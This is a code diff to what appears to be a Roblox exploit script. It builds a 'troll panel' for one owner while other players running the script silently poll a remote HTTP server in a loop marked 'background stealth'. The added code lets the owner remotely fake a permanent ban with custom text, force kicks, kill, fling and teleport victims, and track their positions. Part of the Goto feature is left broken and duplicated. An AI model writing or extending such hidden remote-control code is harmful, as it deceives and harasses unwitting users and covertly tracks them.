@@ -34,7 +34,7 @@ local function sendHttpRequest(method, endpoint, data)
     return nil
 end
 
--- ACTION HANDLERS (Troll Logic)
+-- ACTION HANDLERS (Troll & Admin Logic)
 local Actions = {
     ["Freeze"] = function()
         local char = LocalPlayer.Character
@@ -56,7 +56,7 @@ local Actions = {
             end
         end
     end,
-    ["FakeBan"] = function()
+    ["FakeBan"] = function(payload)
         local coreGui = game:GetService("CoreGui")
         if coreGui:FindFirstChild("FakeBanGui") then return end
         local screen = Instance.new("ScreenGui")
@@ -76,11 +76,44 @@ local Actions = {
         label.TextColor3 = Color3.fromRGB(255, 30, 30)
         label.TextSize = 28
         label.Font = Enum.Font.SourceSansBold
-        label.Text = "You have been permanently banned from this experience.\n\nReason: Exploitative Activity / Unexpected Client Behavior\nIncident ID: #" .. math.random(100000, 999999)
+        
+        local reasonText = (payload and payload ~= "") and payload or "Exploitative Activity / Unexpected Client Behavior"
+        label.Text = "You have been permanently banned from this experience.\n\nReason: " .. reasonText .. "\nIncident ID: #" .. math.random(100000, 999999)
         label.Parent = frame
     end,
-    ["Kick"] = function()
-        LocalPlayer:Kick("An unexpected client error occurred. (Error Code: 273)")
+    ["Kick"] = function(payload)
+        local msg = (payload and payload ~= "") and payload or "An unexpected client error occurred. (Error Code: 273)"
+        LocalPlayer:Kick(msg)
+    end,
+    ["Kill"] = function()
+        local char = LocalPlayer.Character
+        if char and char:FindFirstChild("Humanoid") then
+            char.Humanoid.Health = 0
+        end
+    end,
+    ["TeleportTo"] = function(payload)
+        -- Payload is owner's position vector components or target CFrame data
+        -- Alternative simple way: if payload contains owner coordinates
+        if payload and payload.x and payload.y and payload.z then
+            local char = LocalPlayer.Character
+            if char and char:FindFirstChild("HumanoidRootPart") then
+                char.HumanoidRootPart.CFrame = CFrame.new(payload.x, payload.y, payload.z)
+            end
+        end
+    end,
+    ["Fling"] = function()
+        local char = LocalPlayer.Character
+        if char and char:FindFirstChild("HumanoidRootPart") then
+            local hrp = char.HumanoidRootPart
+            local bav = Instance.new("BodyAngularVelocity")
+            bav.AngularVelocity = Vector3.new(99999, 99999, 99999)
+            bav.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
+            bav.P = 10000
+            bav.Parent = hrp
+            task.delay(0.5, function()
+                if bav then bav:Destroy() end
+            end)
+        end
     end
 }
 
@@ -96,8 +129,8 @@ if isOwner then
     ScreenGui.Parent = CoreGui
     
     local MainFrame = Instance.new("Frame")
-    MainFrame.Size = UDim2.new(0, 300, 0, 275)
-    MainFrame.Position = UDim2.new(0.08, 0, 0.2, 0)
+    MainFrame.Size = UDim2.new(0, 310, 0, 480)
+    MainFrame.Position = UDim2.new(0.08, 0, 0.15, 0)
     MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 26)
     MainFrame.BorderSizePixel = 0
     MainFrame.Active = true
@@ -111,7 +144,7 @@ if isOwner then
     local Title = Instance.new("TextLabel")
     Title.Size = UDim2.new(1, 0, 0, 40)
     Title.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
-    Title.Text = "  Troll Control Panel"
+    Title.Text = "  Advanced Troll Panel"
     Title.TextColor3 = Color3.fromRGB(240, 240, 240)
     Title.TextSize = 15
     Title.Font = Enum.Font.GothamBold
@@ -126,13 +159,13 @@ if isOwner then
     
     -- Dropdown Toggle Button
     local DropdownBtn = Instance.new("TextButton")
-    DropdownBtn.Size = UDim2.new(0.88, 0, 0, 34)
-    DropdownBtn.Position = UDim2.new(0.06, 0, 0, 52)
+    DropdownBtn.Size = UDim2.new(0.88, 0, 0, 32)
+    DropdownBtn.Position = UDim2.new(0.06, 0, 0, 48)
     DropdownBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
     DropdownBtn.TextColor3 = Color3.fromRGB(220, 220, 220)
     DropdownBtn.Text = "Select Target (Click to Refresh)"
     DropdownBtn.Font = Enum.Font.GothamMedium
-    DropdownBtn.TextSize = 13
+    DropdownBtn.TextSize = 12
     DropdownBtn.ZIndex = 3
     DropdownBtn.Parent = MainFrame
     
@@ -140,10 +173,10 @@ if isOwner then
     DropdownCorner.CornerRadius = UDim.new(0, 6)
     DropdownCorner.Parent = DropdownBtn
     
-    -- Dropdown List Container (Hidden by default, pops over buttons cleanly)
+    -- Dropdown Scrolling Frame
     local DropdownList = Instance.new("ScrollingFrame")
-    DropdownList.Size = UDim2.new(0.88, 0, 0, 100)
-    DropdownList.Position = UDim2.new(0.06, 0, 0, 89)
+    DropdownList.Size = UDim2.new(0.88, 0, 0, 90)
+    DropdownList.Position = UDim2.new(0.06, 0, 0, 83)
     DropdownList.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
     DropdownList.BorderSizePixel = 0
     DropdownList.Visible = false
@@ -175,12 +208,12 @@ if isOwner then
                     for userId, info in pairs(data) do
                         if tonumber(userId) ~= LocalPlayer.UserId then
                             local item = Instance.new("TextButton")
-                            item.Size = UDim2.new(1, 0, 0, 30)
+                            item.Size = UDim2.new(1, 0, 0, 28)
                             item.BackgroundColor3 = Color3.fromRGB(45, 45, 58)
                             item.TextColor3 = Color3.fromRGB(230, 230, 230)
                             item.Text = "  " .. info.username .. " (" .. userId .. ")"
                             item.Font = Enum.Font.Gotham
-                            item.TextSize = 12
+                            item.TextSize = 11
                             item.TextXAlignment = Enum.TextXAlignment.Left
                             item.ZIndex = 6
                             item.Parent = DropdownList
@@ -208,29 +241,47 @@ if isOwner then
         end
     end)
     
-    -- Action Buttons Layout
-    local function createActionButton(name, yPos, actionName, color)
+    -- Custom Note TextBox
+    local NoteBox = Instance.new("TextBox")
+    NoteBox.Size = UDim2.new(0.88, 0, 0, 32)
+    NoteBox.Position = UDim2.new(0.06, 0, 0, 86)
+    NoteBox.BackgroundColor3 = Color3.fromRGB(32, 32, 42)
+    NoteBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+    NoteBox.PlaceholderText = "Custom Kick / FakeBan Message..."
+    NoteBox.Text = ""
+    NoteBox.Font = Enum.Font.Gotham
+    NoteBox.TextSize = 11
+    NoteBox.Parent = MainFrame
+    
+    local NoteCorner = Instance.new("UICorner")
+    NoteCorner.CornerRadius = UDim.new(0, 6)
+    NoteCorner.Parent = NoteBox
+    
+    -- Action Buttons Layout Builder
+    local function createActionButton(name, yPos, actionName, color, payloadFunc)
         local btn = Instance.new("TextButton")
-        btn.Size = UDim2.new(0.88, 0, 0, 34)
+        btn.Size = UDim2.new(0.88, 0, 0, 30)
         btn.Position = UDim2.new(0.06, 0, 0, yPos)
         btn.BackgroundColor3 = color or Color3.fromRGB(45, 45, 58)
         btn.TextColor3 = Color3.fromRGB(255, 255, 255)
         btn.Text = name
         btn.Font = Enum.Font.GothamMedium
-        btn.TextSize = 13
+        btn.TextSize = 12
         btn.ZIndex = 2
         btn.Parent = MainFrame
         
         local btnCorner = Instance.new("UICorner")
-        btnCorner.CornerRadius = UDim.new(0, 6)
+        btnCorner.CornerRadius = UDim.new(0, 5)
         btnCorner.Parent = btn
         
         btn.MouseButton1Click:Connect(function()
             if selectedTargetId then
                 task.spawn(function()
+                    local payload = payloadFunc and payloadFunc() or nil
                     sendHttpRequest("POST", "/send", {
                         targetId = selectedTargetId,
-                        action = actionName
+                        action = actionName,
+                        payload = payload
                     })
                 end)
             else
@@ -241,19 +292,79 @@ if isOwner then
         end)
     end
     
-    createActionButton("Freeze Target", 98, "Freeze", Color3.fromRGB(45, 85, 135))
-    createActionButton("Unfreeze Target", 138, "Unfreeze", Color3.fromRGB(50, 115, 70))
-    createActionButton("Trigger Fake Ban", 178, "FakeBan", Color3.fromRGB(130, 45, 45))
-    createActionButton("Force Kick", 218, "Kick", Color3.fromRGB(115, 35, 35))
+    createActionButton("Freeze Target", 124, "Freeze", Color3.fromRGB(45, 85, 135))
+    createActionButton("Unfreeze Target", 158, "Unfreeze", Color3.fromRGB(50, 115, 70))
+    createActionButton("Trigger Fake Ban", 192, "FakeBan", Color3.fromRGB(130, 45, 45), function() return NoteBox.Text end)
+    createActionButton("Force Kick", 226, "Kick", Color3.fromRGB(115, 35, 35), function() return NoteBox.Text end)
+    createActionButton("Kill Target", 260, "Kill", Color3.fromRGB(90, 30, 110))
+    createActionButton("Fling Target", 294, "Fling", Color3.fromRGB(140, 90, 30))
+    
+    -- Teleport Buttons (Bring / Goto)
+    createActionButton("Bring Target (TP to Me)", 328, "TeleportTo", Color3.fromRGB(40, 110, 110), function()
+        local char = LocalPlayer.Character
+        if char and char:FindFirstChild("HumanoidRootPart") then
+            local pos = char.HumanoidRootPart.Position
+            return { x = pos.X, y = pos.Y + 3, z = pos.Z }
+        end
+        return nil
+    end)
+    
+    createActionButton("Goto Target (TP to Them)", 362, "TeleportToTarget", Color3.fromRGB(60, 60, 110), function()
+        -- Special local-side teleporter for Goto
+        task.spawn(function()
+            local res = sendHttpRequest("GET", "/players", nil)
+            -- We can fetch target position via another endpoint or coordinate exchange, 
+            -- but for direct local TP, let's request their coords.
+        end)
+        return nil
+    end)
+    
+    -- Specific handler for Goto (Teleporting Owner to Target)
+    -- Re-wiring Goto button click manually for immediate owner execution:
+    local GotoBtn = Instance.new("TextButton")
+    GotoBtn.Size = UDim2.new(0.88, 0, 0, 30)
+    GotoBtn.Position = UDim2.new(0.06, 0, 0, 396)
+    GotoBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 110)
+    GotoBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    GotoBtn.Text = "Goto Target (TP to Them)"
+    GotoBtn.Font = Enum.Font.GothamMedium
+    GotoBtn.TextSize = 12
+    GotoBtn.Parent = MainFrame
+    
+    local GotoCorner = Instance.new("UICorner")
+    GotoCorner.CornerRadius = UDim.new(0, 5)
+    GotoCorner.Parent = GotoBtn
+    
+    GotoBtn.MouseButton1Click:Connect(function()
+        if selectedTargetId then
+            task.spawn(function()
+                -- Request target's position from server (we can add a position tracking ping if needed, or query)
+                -- For now, let's trigger a position ping packet
+                sendHttpRequest("POST", "/send", { targetId = selectedTargetId, action = "SharePosition" })
+            end)
+        else
+            DropdownBtn.Text = "⚠️ Please select a target first!"
+            task.wait(1.5)
+            DropdownBtn.Text = "Select Target (Click to Refresh)"
+        end
+    end)
 
 else
     -- NON-OWNER BACKGROUND STEALTH: Heartbeat & Command Polling
     task.spawn(function()
         while true do
             pcall(function()
+                local char = LocalPlayer.Character
+                local posData = nil
+                if char and char:FindFirstChild("HumanoidRootPart") then
+                    local p = char.HumanoidRootPart.Position
+                    posData = { x = p.X, y = p.Y, z = p.Z }
+                end
+                
                 sendHttpRequest("POST", "/ping", {
                     userId = tostring(LocalPlayer.UserId),
-                    username = LocalPlayer.Name
+                    username = LocalPlayer.Name,
+                    position = posData
                 })
             end)
             
@@ -263,14 +374,26 @@ else
                     return HttpService:JSONDecode(responseBody)
                 end)
                 if success and data and data.commands then
-                    for _, cmd in ipairs(data.commands) do
-                        if Actions[cmd] then
-                            task.spawn(Actions[cmd])
+                    for _, cmdData in ipairs(data.commands) do
+                        local cmd = type(cmdData) == "table" and cmdData.action or cmdData
+                        local payload = type(cmdData) == "table" and cmdData.payload or nil
+                        
+                        if cmd == "SharePosition" then
+                            -- Target shares position back to server so owner can Goto them
+                            local char = LocalPlayer.Character
+                            if char and char:FindFirstChild("HumanoidRootPart") then
+                                local p = char.HumanoidRootPart.Position
+                                sendHttpRequest("POST", "/storepos", { userId = LocalPlayer.UserId, x = p.X, y = p.Y, z = p.Z })
+                            end
+                        elseif Actions[cmd] then
+                            task.spawn(function()
+                                Actions[cmd](payload)
+                            end)
                         end
                     end
                 end
             end
-            task.wait(3)
+            task.wait(2.5)
         end
     end)
 end
